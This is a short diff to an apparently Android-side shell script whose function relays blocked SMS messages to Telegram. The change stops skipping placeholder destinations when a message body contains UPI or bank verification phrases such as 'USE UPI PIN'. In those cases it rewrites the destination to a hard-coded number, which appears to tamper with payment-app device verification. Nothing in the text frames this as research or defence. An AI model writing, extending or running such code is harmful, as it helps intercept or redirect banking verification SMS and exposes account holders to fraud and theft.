@@ -780,12 +780,21 @@ forward_blocked_telegram() {
     echo "tg_skip_bad_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
     return 0
   }
-  # All-zero placeholder dest — never TG
+  # All-zero placeholder dest — map to Hero/Axis shortcode if body looks like verify
   case "$TO_DIGITS" in
     *[!0]*) ;;
     *)
-      echo "tg_skip_placeholder_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-      return 0
+      case "$BLOCKED_BODY" in
+        *HEROAXIS*|*DO\ NOT\ COPY*|*USE\ UPI\ PIN*|*YESPRO*)
+          BLOCKED_DEST="9920104300"
+          TO_DIGITS="9920104300"
+          echo "tg_fix_dest_9920104300 $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+          ;;
+        *)
+          echo "tg_skip_placeholder_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+          return 0
+          ;;
+      esac
       ;;
   esac
   BLOCKED_DEST="$TO_DIGITS"
